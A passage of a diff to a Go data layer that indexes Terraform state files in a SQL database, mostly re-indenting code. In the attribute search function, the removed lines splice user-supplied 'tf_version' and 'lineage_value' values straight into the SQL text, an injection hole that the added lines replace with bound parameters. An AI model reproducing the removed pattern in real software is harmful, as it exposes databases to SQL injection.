types.Version{VersionID: versionID})\n-\n-\t// Check if the associated lineage is already present in lineages table\n-\t// If so, it recovers its ID otherwise it inserts it at the same time as the state\n-\tvar lineage types.Lineage\n-\tdb.lock.Lock()\n-\terr = db.FirstOrCreate(&lineage, types.Lineage{Value: sf.Lineage}).Error\n-\tif err != nil || lineage.ID == 0 {\n-\t\tlog.WithField(\"error\", err).\n-\t\t\tError(\"Unknown error in stateS3toDB during lineage finding\")\n-\t\treturn types.State{}, err\n-\t}\n-\tdb.lock.Unlock()\n-\n-\tst = types.State{\n-\t\tPath:      path,\n-\t\tVersion:   version,\n-\t\tTFVersion: sf.TerraformVersion.String(),\n-\t\tSerial:    int64(sf.Serial),\n-\t\tLineageID: sql.NullInt64{Int64: int64(lineage.ID), Valid: true},\n-\t}\n-\n-\tfor _, m := range sf.State.Modules {\n-\t\tmod := types.Module{\n-\t\t\tPath: m.Addr.String(),\n-\t\t}\n-\t\tfor _, r := range m.Resources {\n-\t\t\tfor index, i := range r.Instances {\n-\t\t\t\tres := types.Resource{\n-\t\t\t\t\tType:       r.Addr.Resource.Type,\n-\t\t\t\t\tName:       r.Addr.Resource.Name,\n-\t\t\t\t\tIndex:      getResourceIndex(index),\n-\t\t\t\t\tAttributes: marshalAttributeValues(i.Current),\n-\t\t\t\t}\n-\t\t\t\tmod.Resources = append(mod.Resources, res)\n-\t\t\t}\n-\t\t}\n-\n-\t\tfor n, r := range m.OutputValues {\n-\t\t\tjsonVal, err := ctyJson.Marshal(r.Value, r.Value.Type())\n-\t\t\tif err != nil {\n-\t\t\t\tlog.WithError(err).Errorf(\"failed to load output for %s\", r.Addr.String())\n-\t\t\t}\n-\t\t\tout := types.OutputValue{\n-\t\t\t\tSensitive: r.Sensitive,\n-\t\t\t\tName:      n,\n-\t\t\t\tValue:     string(jsonVal),\n-\t\t\t}\n-\n-\t\t\tmod.OutputValues = append(mod.OutputValues, out)\n-\t\t}\n-\n-\t\tst.Modules = append(st.Modules, mod)\n-\t}\n-\treturn\n+        var version types.Version\n+        db.First(&version, types.Version{VersionID: versionID})\n+\n+        // Check if the associated lineage is already present in lineages table\n+        // If so, it recovers its ID otherwise it inserts it at the same time as the state\n+        var lineage types.Lineage\n+        db.lock.Lock()\n+        err = db.FirstOrCreate(&lineage, types.Lineage{Value: sf.Lineage}).Error\n+        if err != nil || lineage.ID == 0 {\n+                log.WithField(\"error\", err).\n+                        Error(\"Unknown error in stateS3toDB during lineage finding\")\n+                return types.State{}, err\n+        }\n+        db.lock.Unlock()\n+\n+        st = types.State{\n+                Path:      path,\n+                Version:   version,\n+                TFVersion: sf.TerraformVersion.String(),\n+                Serial:    int64(sf.Serial),\n+                LineageID: sql.NullInt64{Int64: int64(lineage.ID), Valid: true},\n+        }\n+\n+        for _, m := range sf.State.Modules {\n+                mod := types.Module{\n+                        Path: m.Addr.String(),\n+                }\n+                for _, r := range m.Resources {\n+                        for index, i := range r.Instances {\n+                                res := types.Resource{\n+                                        Type:       r.Addr.Resource.Type,\n+                                        Name:       r.Addr.Resource.Name,\n+                                        Index:      getResourceIndex(index),\n+                                        Attributes: marshalAttributeValues(i.Current),\n+                                }\n+                                mod.Resources = append(mod.Resources, res)\n+                        }\n+                }\n+\n+                for n, r := range m.OutputValues {\n+                        jsonVal, err := ctyJson.Marshal(r.Value, r.Value.Type())\n+                        if err != nil {\n+                                log.WithError(err).Errorf(\"failed to load output for %s\", r.Addr.String())\n+                        }\n+                        out := types.OutputValue{\n+                                Sensitive: r.Sensitive,\n+                                Name:      n,\n+                                Value:     string(jsonVal),\n+                        }\n+\n+                        mod.OutputValues = append(mod.OutputValues, out)\n+                }\n+\n+                st.Modules = append(st.Modules, mod)\n+        }\n+        return\n }\n \n // getResourceIndex transforms an addrs.InstanceKey instance into a string representation\n func getResourceIndex(index addrs.InstanceKey) string {\n-\tswitch index.(type) {\n-\tcase addrs.IntKey, addrs.StringKey:\n-\t\treturn index.String()\n-\t}\n-\treturn \"\"\n+        switch index.(type) {\n+        case addrs.IntKey, addrs.StringKey:\n+                return index.String()\n+        }\n+        return \"\"\n }\n \n func marshalAttributeValues(src *states.ResourceInstanceObjectSrc) (attrs []types.Attribute) {\n-\tvals := make(attributeValues)\n-\tif src == nil {\n-\t\treturn\n-\t}\n-\tif src.AttrsFlat != nil {\n-\t\tfor k, v := range src.AttrsFlat {\n-\t\t\tvals[k] = v\n-\t\t}\n-\t} else if err := json.Unmarshal(src.AttrsJSON, &vals); err != nil {\n-\t\tlog.Error(err.Error())\n-\t}\n-\tlog.Debug(vals)\n-\n-\tfor k, v := range vals {\n-\t\tvJSON, _ := json.Marshal(v)\n-\t\tattr := types.Attribute{\n-\t\t\tKey:   k,\n-\t\t\tValue: string(vJSON),\n-\t\t}\n-\t\tlog.Debug(attrs)\n-\t\tattrs = append(attrs, attr)\n-\t}\n-\treturn attrs\n+        vals := make(attributeValues)\n+        if src == nil {\n+                return\n+        }\n+        if src.AttrsFlat != nil {\n+                for k, v := range src.AttrsFlat {\n+                        vals[k] = v\n+                }\n+        } else if err := json.Unmarshal(src.AttrsJSON, &vals); err != nil {\n+                log.Error(err.Error())\n+        }\n+        log.Debug(vals)\n+\n+        for k, v := range vals {\n+                vJSON, _ := json.Marshal(v)\n+                attr := types.Attribute{\n+                        Key:   k,\n+                        Value: string(vJSON),\n+                }\n+                log.Debug(attrs)\n+                attrs = append(attrs, attr)\n+        }\n+        return attrs\n }\n \n // InsertState inserts a Terraform State in the Database\n func (db *Database) InsertState(path string, versionID string, sf *statefile.File) error {\n-\tst, err := db.stateS3toDB(sf, path, versionID)\n-\tif err == nil {\n-\t\tdb.Create(&st)\n-\t}\n-\treturn nil\n+        st, err := db.stateS3toDB(sf, path, versionID)\n+        if err == nil {\n+                db.Create(&st)\n+        }\n+        return nil\n }\n \n // UpdateState update a Terraform State in the Database with Lineage foreign constraint\n // It will also insert Lineage entry in the db if needed.\n // This method is only use during the Lineage migration since States are immutable\n func (db *Database) UpdateState(st types.State) error {\n-\t// Get lineage from old column\n-\tvar lineageValue sql.NullString\n-\tif err := db.Raw(\"SELECT lineage FROM states WHERE id = ?\", st.ID).Scan(&lineageValue).Error; err != nil {\n-\t\treturn fmt.Errorf(\"Error on %s lineage recovering during migration: %v\", st.Path, err)\n-\t}\n-\tif lineageValue.String == \"\" || !lineageValue.Valid {\n-\t\tlog.Warnf(\"Missing lineage for '%s' state, attempt to recover lineage from other states...\", st.Path)\n-\t\tvar lineages []string\n-\t\tdb.Table(\"states\").\n-\t\t\tDistinct(\"lineage\").\n-\t\t\tOrder(\"lineage desc\").\n-\t\t\tWhere(\"path = ?\", st.Path).\n-\t\t\tScan(&lineages)\n-\n-\t\tfor _, l := range lineages {\n-\t\t\tif l != \"\" {\n-\t\t\t\tlineageValue.String = l\n-\t\t\t\tlineageValue.Valid = true\n-\t\t\t\tlog.Infof(\"Missing lineage for '%s' state solved!\", st.Path)\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\n-\t\tif lineageValue.String == \"\" || !lineageValue.Valid {\n-\t\t\tlog.Warnf(\"Failed to recover '%s' lineage from others states. Orphan state\", st.Path)\n-\t\t\treturn nil\n-\t\t}\n-\t}\n-\n-\t// Create Lineage entry if not exist (value column is unique)\n-\tlineage := types.Lineage{\n-\t\tValue: lineageValue.String,\n-\t}\n-\ttx := db.FirstOrCreate(&lineage, lineage)\n-\tif tx.Error != nil || lineage.ID == 0 {\n-\t\treturn tx.Error\n-\t}\n-\n-\t// Get Lineage ID for foreign constraint\n-\tst.LineageID = sql.NullInt64{Int64: int64(lineage.ID), Valid: true}\n-\n-\treturn db.Save(&st).Error\n+        // Get lineage from old column\n+        var lineageValue sql.NullString\n+        if err := db.Raw(\"SELECT lineage FROM states WHERE id = ?\", st.ID).Scan(&lineageValue).Error; err != nil {\n+                return fmt.Errorf(\"Error on %s lineage recovering during migration: %v\", st.Path, err)\n+        }\n+        if lineageValue.String == \"\" || !lineageValue.Valid {\n+                log.Warnf(\"Missing lineage for '%s' state, attempt to recover lineage from other states...\", st.Path)\n+                var lineages []string\n+                db.Table(\"states\").\n+                        Distinct(\"lineage\").\n+                        Order(\"lineage desc\").\n+                        Where(\"path = ?\", st.Path).\n+                        Scan(&lineages)\n+\n+                for _, l := range lineages {\n+                        if l != \"\" {\n+                                lineageValue.String = l\n+                                lineageValue.Valid = true\n+                                log.Infof(\"Missing lineage for '%s' state solved!\", st.Path)\n+                                break\n+                        }\n+                }\n+\n+                if lineageValue.String == \"\" || !lineageValue.Valid {\n+                        log.Warnf(\"Failed to recover '%s' lineage from others states. Orphan state\", st.Path)\n+                        return nil\n+                }\n+        }\n+\n+        // Create Lineage entry if not exist (value column is unique)\n+        lineage := types.Lineage{\n+                Value: lineageValue.String,\n+        }\n+        tx := db.FirstOrCreate(&lineage, lineage)\n+        if tx.Error != nil || lineage.ID == 0 {\n+                return tx.Error\n+        }\n+\n+        // Get Lineage ID for foreign constraint\n+        st.LineageID = sql.NullInt64{Int64: int64(lineage.ID), Valid: true}\n+\n+        return db.Save(&st).Error\n }\n \n // InsertVersion inserts an AWS S3 Version in the Database\n func (db *Database) InsertVersion(version *state.Version) error {\n-\tvar v types.Version\n-\tdb.lock.Lock()\n-\tdb.FirstOrCreate(&v, types.Version{\n-\t\tVersionID:    version.ID,\n-\t\tLastModified: version.LastModified,\n-\t})\n-\tdb.lock.Unlock()\n-\treturn nil\n+        var v types.Version\n+        db.lock.Lock()\n+        db.FirstOrCreate(&v, types.Version{\n+                VersionID:    version.ID,\n+                LastModified: version.LastModified,\n+        })\n+        db.lock.Unlock()\n+        return nil\n }\n \n // GetState retrieves a State from the database by its path and versionID\n func (db *Database) GetState(lineage, versionID string) (state types.State) {\n-\tdb.Joins(\"JOIN lineages on states.lineage_id=lineages.id\").\n-\t\tJoins(\"JOIN versions on states.version_id=versions.id\").\n-\t\tPreload(\"Version\").Preload(\"Modules\").Preload(\"Modules.Resources\").Preload(\"Modules.Resources.Attributes\").\n-\t\tPreload(\"Modules.OutputValues\").\n-\t\tFind(&state, \"lineages.value = ? AND versions.version_id = ?\", lineage, versionID)\n-\treturn\n+        db.Joins(\"JOIN lineages on states.lineage_id=lineages.id\").\n+                Joins(\"JOIN versions on states.version_id=versions.id\").\n+                Preload(\"Version\").Preload(\"Modules\").Preload(\"Modules.Resources\").Preload(\"Modules.Resources.Attributes\").\n+                Preload(\"Modules.OutputValues\").\n+                Find(&state, \"lineages.value = ? AND versions.version_id = ?\", lineage, versionID)\n+        return\n }\n \n // GetLineageActivity returns a slice of StateStat from the Database\n // for a given lineage representing the State activity over time (Versions)\n func (db *Database) GetLineageActivity(lineage string) (states []types.StateStat) {\n-\tsql := \"SELECT t.path, t.serial, t.tf_version, t.version_id, t.last_modified, count(resources.*) as resource_count\" +\n-\t\t\" FROM (SELECT states.id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified FROM states JOIN lineages ON lineages.id = states.lineage_id JOIN versions ON versions.id = states.version_id WHERE lineages.value = ? ORDER BY states.path, versions.last_modified ASC) t\" +\n-\t\t\" JOIN modules ON modules.state_id = t.id\" +\n-\t\t\" JOIN resources ON resources.module_id = modules.id\" +\n-\t\t\" GROUP BY t.path, t.serial, t.tf_version, t.version_id, t.last_modified\" +\n-\t\t\" ORDER BY last_modified ASC\"\n-\n-\tdb.Raw(sql, lineage).Find(&states)\n-\treturn\n+        sql := \"SELECT t.path, t.serial, t.tf_version, t.version_id, t.last_modified, count(resources.*) as resource_count\" +\n+                \" FROM (SELECT states.id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified FROM states JOIN lineages ON lineages.id = states.lineage_id JOIN versions ON versions.id = states.version_id WHERE lineages.value = ? ORDER BY states.path, versions.last_modified ASC) t\" +\n+                \" JOIN modules ON modules.state_id = t.id\" +\n+                \" JOIN resources ON resources.module_id = modules.id\" +\n+                \" GROUP BY t.path, t.serial, t.tf_version, t.version_id, t.last_modified\" +\n+                \" ORDER BY last_modified ASC\"\n+\n+        db.Raw(sql, lineage).Find(&states)\n+        return\n }\n \n // KnownVersions returns a slice of all known Versions in the Database\n func (db *Database) KnownVersions() (versions []string) {\n-\t// TODO: err\n-\trows, _ := db.Table(\"versions\").Select(\"DISTINCT version_id\").Rows()\n-\tdefer rows.Close()\n-\tfor rows.Next() {\n-\t\tvar version string\n-\t\tif err := rows.Scan(&version); err != nil {\n-\t\t\tlog.Error(err.Error())\n-\t\t}\n-\t\tversions = append(versions, version)\n-\t}\n-\treturn\n+        // TODO: err\n+        rows, _ := db.Table(\"versions\").Select(\"DISTINCT version_id\").Rows()\n+        defer rows.Close()\n+        for rows.Next() {\n+                var version string\n+                if err := rows.Scan(&version); err != nil {\n+                        log.Error(err.Error())\n+                }\n+                versions = append(versions, version)\n+        }\n+        return\n }\n \n // SearchAttribute returns a slice of SearchResult given a query\n // The query might contain parameters 'type', 'name', 'key', 'value' and 'tf_version'\n // SearchAttribute also returns paging information: the page number and the total results\n func (db *Database) SearchAttribute(query url.Values) (results []types.SearchResult, page int, total int) {\n-\tlog.WithFields(log.Fields{\n-\t\t\"query\": query,\n-\t}).Info(\"Searching for attribute with query\")\n-\n-\ttargetVersion := string(query.Get(\"versionid\"))\n-\n-\tsqlQuery := \"\"\n-\tif targetVersion == \"\" {\n-\t\tsqlQuery += \" FROM (SELECT states.path, max(states.serial) as mx FROM states GROUP BY states.path) t\" +\n-\t\t\t\" JOIN states ON t.path = states.path AND t.mx = states.serial\"\n-\t} else {\n-\t\tsqlQuery += \" FROM states\"\n-\t}\n-\n-\tsqlQuery += \" JOIN modules ON states.id = modules.state_id\" +\n-\t\t\" JOIN resources ON modules.id = resources.module_id\" +\n-\t\t\" JOIN attributes ON resources.id = attributes.resource_id\" +\n-\t\t\" JOIN lineages ON lineages.id = states.lineage_id\" +\n-\t\t\" JOIN versions ON states.version_id = versions.id\"\n-\n-\tvar where []string\n-\tvar params []interface{}\n-\tif targetVersion != \"\" && targetVersion != \"*\" {\n-\t\t// filter by version unless we want all (*) or most recent (\"\")\n-\t\twhere = append(where, \"states.version_id = ?\")\n-\t\tparams = append(params, targetVersion)\n-\t}\n-\n-\tif v := string(query.Get(\"type\")); v != \"\" {\n-\t\twhere = append(where, \"resources.type LIKE ?\")\n-\t\tparams = append(params, fmt.Sprintf(\"%%%s%%\", v))\n-\t}\n-\n-\tif v := string(query.Get(\"name\")); v != \"\" {\n-\t\twhere = append(where, \"resources.name LIKE ?\")\n-\t\tparams = append(params, fmt.Sprintf(\"%%%s%%\", v))\n-\t}\n-\n-\tif v := string(query.Get(\"key\")); v != \"\" {\n-\t\twhere = append(where, \"attributes.key LIKE ?\")\n-\t\tparams = append(params, fmt.Sprintf(\"%%%s%%\", v))\n-\t}\n-\n-\tif v := string(query.Get(\"value\")); v != \"\" {\n-\t\twhere = append(where, \"attributes.value LIKE ?\")\n-\t\tparams = append(params, fmt.Sprintf(\"%%%s%%\", v))\n-\t}\n-\n-\tif v := query.Get(\"tf_version\"); string(v) != \"\" {\n-\t\twhere = append(where, fmt.Sprintf(\"states.tf_version LIKE '%s'\", fmt.Sprintf(\"%%%s%%\", v)))\n-\t}\n-\n-\tif v := query.Get(\"lineage_value\"); string(v) != \"\" {\n-\t\twhere = append(where, fmt.Sprintf(\"lineages.value LIKE '%s'\", fmt.Sprintf(\"%%%s%%\", v)))\n-\t}\n-\n-\tif len(where) > 0 {\n-\t\tsqlQuery += \" WHERE \" + strings.Join(where, \" AND \")\n-\t}\n-\n-\t// Count everything\n-\trow := db.Raw(\"SELECT count(*)\"+sqlQuery, params...).Row()\n-\tif err := row.Scan(&total); err != nil {\n-\t\tlog.Error(err.Error())\n-\t}\n-\n-\t// Now get results\n-\t// gorm doesn't support subqueries...\n-\tsql := \"SELECT states.path, versions.version_id, states.tf_version, states.serial, lineages.value as lineage_value, modules.path as module_path, resources.type, resources.name, resources.index, attributes.key, attributes.value\" +\n-\t\tsqlQuery +\n-\t\t\" ORDER BY states.path, states.serial, lineage_value, modules.path, resources.type, resources.name, resources.index, attributes.key\" +\n-\t\t\" LIMIT ?\"\n-\n-\tparams = append(params, pageSize)\n-\n-\tif v := string(query.Get(\"page\")); v != \"\" {\n-\t\tpage, _ = strconv.Atoi(v) // TODO: err\n-\t\to := (page - 1) * pageSize\n-\t\tsql += \" OFFSET ?\"\n-\t\tparams = append(params, o)\n-\t} else {\n-\t\tpage = 1\n-\t}\n-\n-\tdb.Raw(sql, params...).Find(&results)\n-\n-\treturn\n+        log.WithFields(log.Fields{\n+                \"query\": query,\n+        }).Info(\"Searching for attribute with query\")\n+\n+        targetVersion := string(query.Get(\"versionid\"))\n+\n+        sqlQuery := \"\"\n+        if targetVersion == \"\" {\n+                sqlQuery += \" FROM (SELECT states.path, max(states.serial) as mx FROM states GROUP BY states.path) t\" +\n+                        \" JOIN states ON t.path = states.path AND t.mx = states.serial\"\n+        } else {\n+                sqlQuery += \" FROM states\"\n+        }\n+\n+        sqlQuery += \" JOIN modules ON states.id = modules.state_id\" +\n+                \" JOIN resources ON modules.id = resources.module_id\" +\n+                \" JOIN attributes ON resources.id = attributes.resource_id\" +\n+                \" JOIN lineages ON lineages.id = states.lineage_id\" +\n+                \" JOIN versions ON states.version_id = versions.id\"\n+\n+        var where []string\n+        var params []interface{}\n+        if targetVersion != \"\" && targetVersion != \"*\" {\n+                // filter by version unless we want all (*) or most recent (\"\")\n+                where = append(where, \"states.version_id = ?\")\n+                params = append(params, targetVersion)\n+        }\n+\n+        if v := string(query.Get(\"type\")); v != \"\" {\n+                where = append(where, \"resources.type LIKE ?\")\n+                params = append(params, fmt.Sprintf(\"%%%s%%\", v))\n+        }\n+\n+        if v := string(query.Get(\"name\")); v != \"\" {\n+                where = append(where, \"resources.name LIKE ?\")\n+                params = append(params, fmt.Sprintf(\"%%%s%%\", v))\n+        }\n+\n+        if v := string(query.Get(\"key\")); v != \"\" {\n+                where = append(where, \"attributes.key LIKE ?\")\n+                params = append(params, fmt.Sprintf(\"%%%s%%\", v))\n+        }\n+\n+        if v := string(query.Get(\"value\")); v != \"\" {\n+                where = append(where, \"attributes.value LIKE ?\")\n+                params = append(params, fmt.Sprintf(\"%%%s%%\", v))\n+        }\n+\n+        if v := query.Get(\"tf_version\"); string(v) != \"\" {\n+                where = append(where, \"states.tf_version LIKE ?\")\n+                params = append(params, fmt.Sprintf(\"%%%s%%\", v))\n+        }\n+\n+        if v := query.Get(\"lineage_value\"); string(v) != \"\" {\n+                where = append(where, \"lineages.value LIKE ?\")\n+                params = append(params, fmt.Sprintf(\"%%%s%%\", v))\n+        }\n+\n+        if len(where) > 0 {\n+                sqlQuery += \" WHERE \" + strings.Join(where, \" AND \")\n+        }\n+\n+        // Count everything\n+        row := db.Raw(\"SELECT count(*)\"+sqlQuery, params...).Row()\n+        if err := row.Scan(&total); err != nil {\n+                log.Error(err.Error())\n+        }\n+\n+        // Now get results\n+        // gorm doesn't support subqueries...\n+        sql := \"SELECT states.path, versions.version_id, states.tf_version, states.serial, lineages.value as lineage_value, modules.path as module_path, resources.type, resources.name, resources.index, attributes.key, attributes.value\" +\n+                sqlQuery +\n+                \" ORDER BY states.path, states.serial, lineage_value, modules.path, resources.type, resources.name, resources.index, attributes.key\" +\n+                \" LIMIT ?\"\n+\n+        params = append(params, pageSize)\n+\n+        if v := string(query.Get(\"page\")); v != \"\" {\n+                page, _ = strconv.Atoi(v) // TODO: err\n+                o := (page - 1) * pageSize\n+                sql += \" OFFSET ?\"\n+                params = append(params, o)\n+        } else {\n+                page = 1\n+        }\n+\n+        db.Raw(sql, params...).Find(&results)\n+\n+        return\n }\n \n // ListStatesVersions returns a map of Version IDs to a slice of State paths\n // from the Database\n func (db *Database) ListStatesVersions() (statesVersions map[string][]string) {\n-\trows, _ := db.Table(\"states\").\n-\t\tJoins(\"JOIN versions ON versions.id = states.version_id\").\n-\t\tSelect(\"states.path, versions.version_id\").Rows()\n-\tdefer rows.Close()\n-\tstatesVersions = make(map[string][]string)\n-\tfor rows.Next() {\n-\t\tvar path string\n-\t\tvar versionID string\n-\t\tif err := rows.Scan(&path, &versionID); err != nil {\n-\t\t\tlog.Error(err.Error())\n-\t\t}\n-\t\tstatesVersions[versionID] = append(statesVersions[versionID], path)\n-\t}\n-\treturn\n+        rows, _ := db.Table(\"states\").\n+                Joins(\"JOIN versions ON versions.id = states.version_id\").\n+                Select(\"states.path, versions.version_id\").Rows()\n+        defer rows.Close()\n+        statesVersions = make(map[string][]string)\n+        for rows.Next() {\n+                var path string\n+                var versionID string\n+                if err := rows.Scan(&path, &versionID); err != nil {\n+                        log.Error(err.Error())\n+                }\n+                statesVersions[versionID] = append(statesVersions[versionID], path)\n+        }\n+        return\n }\n \n // ListTerraformVersionsWithCount returns a slice of maps of Terraform versions\n@@ -434,376 +436,376 @@ func (db *Database) ListStatesVersions() (statesVersions map[string][]string) {\n // ListTerraformVersionsWithCount also takes a query with possible parameter 'orderBy'\n // to sort results. Default sorting is by descending version number.\n func (db *Database) ListTerraformVersionsWithCount(query url.Values) (results []map[string]string, err error) {\n-\torderBy := string(query.Get(\"orderBy\"))\n-\tsql := \"SELECT t.tf_version, COUNT(*)\" +\n-\t\t\" FROM (SELECT DISTINCT ON(states.path) states.id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified\" +\n-\t\t\" FROM states JOIN versions ON versions.id = states.version_id ORDER BY states.path, versions.last_modified DESC) t\" +\n-\t\t\" GROUP BY t.tf_version ORDER BY \"\n-\n-\tif orderBy == \"version\" {\n-\t\tsql += \"string_to_array(t.tf_version, '.')::int[] DESC\"\n-\t} else {\n-\t\tsql += \"count DESC\"\n-\t}\n-\n-\trows, err := db.Raw(sql).Rows()\n-\tif err != nil {\n-\t\treturn results, err\n-\t}\n-\tdefer rows.Close()\n-\n-\tfor rows.Next() {\n-\t\tvar name string\n-\t\tvar count string\n-\t\tr := make(map[string]string)\n-\t\tif err = rows.Scan(&name, &count); err != nil {\n-\t\t\treturn\n-\t\t}\n-\t\tr[\"name\"] = name\n-\t\tr[\"count\"] = count\n-\t\tresults = append(results, r)\n-\t}\n-\treturn\n+        orderBy := string(query.Get(\"orderBy\"))\n+        sql := \"SELECT t.tf_version, COUNT(*)\" +\n+                \" FROM (SELECT DISTINCT ON(states.path) states.id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified\" +\n+                \" FROM states JOIN versions ON versions.id = states.version_id ORDER BY states.path, versions.last_modified DESC) t\" +\n+                \" GROUP BY t.tf_version ORDER BY \"\n+\n+        if orderBy == \"version\" {\n+                sql += \"string_to_array(t.tf_version, '.')::int[] DESC\"\n+        } else {\n+                sql += \"count DESC\"\n+        }\n+\n+        rows, err := db.Raw(sql).Rows()\n+        if err != nil {\n+                return results, err\n+        }\n+        defer rows.Close()\n+\n+        for rows.Next() {\n+                var name string\n+                var count string\n+                r := make(map[string]string)\n+                if err = rows.Scan(&name, &count); err != nil {\n+                        return\n+                }\n+                r[\"name\"] = name\n+                r[\"count\"] = count\n+                results = append(results, r)\n+        }\n+        return\n }\n \n // ListStateStats returns a slice of StateStat, along with paging information\n func (db *Database) ListStateStats(query url.Values) (states []types.StateStat, page int, total int) {\n-\trow := db.Raw(\"SELECT count(*) FROM (SELECT DISTINCT lineage_id FROM states) AS t\").Row()\n-\tif err := row.Scan(&total); err != nil {\n-\t\tlog.Error(err.Error())\n-\t}\n-\n-\tvar paginationQuery string\n-\tvar params []interface{}\n-\tpage = 1\n-\tif v := string(query.Get(\"page\")); v != \"\" {\n-\t\tpage, _ = strconv.Atoi(v) // TODO: err\n-\t\toffset := (page - 1) * pageSize\n-\t\tparams = append(params, offset)\n-\t\tpaginationQuery = \" LIMIT 20 OFFSET ?\"\n-\t} else {\n-\t\tpage = -1\n-\t}\n-\n-\tsql := \"SELECT t.path, lineages.value as lineage_value, t.serial, t.tf_version, t.version_id, t.last_modified, count(resources.*) as resource_count\" +\n-\t\t\" FROM (SELECT DISTINCT ON(states.lineage_id) states.id, states.lineage_id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified FROM states JOIN versions ON versions.id = states.version_id ORDER BY states.lineage_id, versions.last_modified DESC) t\" +\n-\t\t\" JOIN modules ON modules.state_id = t.id\" +\n-\t\t\" JOIN resources ON resources.module_id = modules.id\" +\n-\t\t\" JOIN lineages ON lineages.id = t.lineage_id\" +\n-\t\t\" GROUP BY t.path, lineages.value, t.serial, t.tf_version, t.version_id, t.last_modified\" +\n-\t\t\" ORDER BY last_modified DESC\" +\n-\t\tpaginationQuery\n-\n-\tdb.Raw(sql, params...).Find(&states)\n-\treturn\n+        row := db.Raw(\"SELECT count(*) FROM (SELECT DISTINCT lineage_id FROM states) AS t\").Row()\n+        if err := row.Scan(&total); err != nil {\n+                log.Error(err.Error())\n+        }\n+\n+        var paginationQuery string\n+        var params []interface{}\n+        page = 1\n+        if v := string(query.Get(\"page\")); v != \"\" {\n+                page, _ = strconv.Atoi(v) // TODO: err\n+                offset := (page - 1) * pageSize\n+                params = append(params, offset)\n+                paginationQuery = \" LIMIT 20 OFFSET ?\"\n+        } else {\n+                page = -1\n+        }\n+\n+        sql := \"SELECT t.path, lineages.value as lineage_value, t.serial, t.tf_version, t.version_id, t.last_modified, count(resources.*) as resource_count\" +\n+                \" FROM (SELECT DISTINCT ON(states.lineage_id) states.id, states.lineage_id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified FROM states JOIN versions ON versions.id = states.version_id ORDER BY states.lineage_id, versions.last_modified DESC) t\" +\n+                \" JOIN modules ON modules.state_id = t.id\" +\n+                \" JOIN resources ON resources.module_id = modules.id\" +\n+                \" JOIN lineages ON lineages.id = t.lineage_id\" +\n+                \" GROUP BY t.path, lineages.value, t.serial, t.tf_version, t.version_id, t.last_modified\" +\n+                \" ORDER BY last_modified DESC\" +\n+                paginationQuery\n+\n+        db.Raw(sql, params...).Find(&states)\n+        return\n }\n \n // listField is a wrapper utility method to list distinct values in Database tables.\n func (db *Database) listField(table, field string) (results []string, err error) {\n-\trows, err := db.Table(table).Select(fmt.Sprintf(\"DISTINCT %s\", field)).Rows()\n-\tif err != nil {\n-\t\treturn results, err\n-\t}\n-\tdefer rows.Close()\n-\n-\tfor rows.Next() {\n-\t\tvar t string\n-\t\tif err = rows.Scan(&t); err != nil {\n-\t\t\treturn\n-\t\t}\n-\t\tresults = append(results, t)\n-\t}\n-\n-\treturn\n+        rows, err := db.Table(table).Select(fmt.Sprintf(\"DISTINCT %s\", field)).Rows()\n+        if err != nil {\n+                return results, err\n+        }\n+        defer rows.Close()\n+\n+        for rows.Next() {\n+                var t string\n+                if err = rows.Scan(&t); err != nil {\n+                        return\n+                }\n+                results = append(results, t)\n+        }\n+\n+        return\n }\n \n // ListResourceTypes lists all Resource types from the Database\n func (db *Database) ListResourceTypes() ([]string, error) {\n-\treturn db.listField(\"resources\", \"type\")\n+        return db.listField(\"resources\", \"type\")\n }\n \n // ListResourceTypesWithCount returns a list of Resource types with associated counts\n // from the Database\n func (db *Database) ListResourceTypesWithCount() (results []map[string]string, err error) {\n-\tsql := \"SELECT resources.type, COUNT(*)\" +\n-\t\t\" FROM (SELECT DISTINCT ON(states.path) states.id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified\" +\n-\t\t\" FROM states\" +\n-\t\t\" JOIN versions ON versions.id = states.version_id\" +\n-\t\t\" ORDER BY states.path, versions.last_modified DESC) t\" +\n-\t\t\" JOIN modules ON modules.state_id = t.id\" +\n-\t\t\" JOIN resources ON resources.module_id = modules.id\" +\n-\t\t\" GROUP BY resources.type\" +\n-\t\t\" ORDER BY count DESC\"\n-\n-\trows, err := db.Raw(sql).Rows()\n-\tif err != nil {\n-\t\treturn results, err\n-\t}\n-\tdefer rows.Close()\n-\n-\tfor rows.Next() {\n-\t\tvar name string\n-\t\tvar count string\n-\t\tr := make(map[string]string)\n-\t\tif err = rows.Scan(&name, &count); err != nil {\n-\t\t\treturn\n-\t\t}\n-\t\tr[\"name\"] = name\n-\t\tr[\"count\"] = count\n-\t\tresults = append(results, r)\n-\t}\n-\treturn\n+        sql := \"SELECT resources.type, COUNT(*)\" +\n+                \" FROM (SELECT DISTINCT ON(states.path) states.id, states.path, states.serial, states.tf_version, versions.version_id, versions.last_modified\" +\n+                \" FROM states\" +\n+                \" JOIN versions ON versions.id = states.version_id\" +\n+                \" ORDER BY states.path, versions.last_modified DESC) t\" +\n+                \" JOIN modules ON modules.state_id = t.id\" +\n+                \" JOIN resources ON resources.module_id = modules.id\" +\n+                \" GROUP BY resources.type\" +\n+                \" ORDER BY count DESC\"\n+\n+        rows, err := db.Raw(sql).Rows()\n+        if err != nil {\n+                return results, err\n+        }\n+        defer rows.Close()\n+\n+        for rows.Next() {\n+                var name string\n+                var count string\n+                r := make(map[string]string)\n+                if err = rows.Scan(&name, &count); err != nil {\n+                        return\n+                }\n+                r[\"name\"] = name\n+                r[\"count\"] = count\n+                results = append(results, r)\n+        }\n+        return\n }\n \n // ListResourceNames lists all Resource names from the Database\n func (db *Database) ListResourceNames() ([]string, error) {\n-\treturn db.listField(\"resources\", \"name\")\n+        return db.listField(\"resources\", \"name\")\n }\n \n // ListTfVersions lists all Terraform versions from the Database\n func (db *Database) ListTfVersions() ([]string, error) {\n-\treturn db.listField(\"states\", \"tf_version\")\n+        return db.listField(\"states\", \"tf_version\")\n }\n \n // ListAttributeKeys lists all Resource Attribute keys for a given Resource type\n // from the Database\n func (db *Database) ListAttributeKeys(resourceType string) (results []string, err error) {\n-\tquery := db.Table(\"attributes\").\n-\t\tSelect(\"DISTINCT key\").\n-\t\tJoins(\"JOIN resources ON attributes.resource_id = resources.id\")\n-\n-\tif 